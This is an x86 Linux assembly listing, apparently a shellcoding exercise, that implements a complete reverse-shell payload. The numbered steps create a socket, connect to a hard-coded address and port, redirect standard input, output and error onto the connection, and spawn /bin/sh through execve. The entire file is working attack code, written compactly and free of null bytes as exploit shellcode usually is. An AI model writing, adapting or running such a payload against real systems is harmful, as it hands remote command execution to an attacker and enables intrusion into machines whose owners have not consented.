global _start

section .text

_start:

    ; // 1. Create socket

    push 0x66
    pop eax

    push 0x1
    pop ebx

    xor ecx, ecx
    push ecx
    push ebx
    push 0x2
    mov ecx, esp
    int 0x80
    mov esi, eax

    ; // 2. Connect socket to remote port and address

    mov al, 0x66

    pop ebx

    push 0x0101017f
    push word 0xba13
    push bx
    mov ecx, esp

    push 0x10
    push ecx
    push esi
    mov ecx, esp
    inc ebx
    int 0x80

    ; // 3. Duplicate stdin, stdout and stderr file descriptors

    xchg ebx, esi

    push 0x2
    pop ecx

    loop:

        mov al, 0x3f
        int 0x80
        dec ecx
        jns loop

    ; // 4. Spawn shell

    inc ecx
    push ecx
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp

    mov al, 0xb
    int 0x80
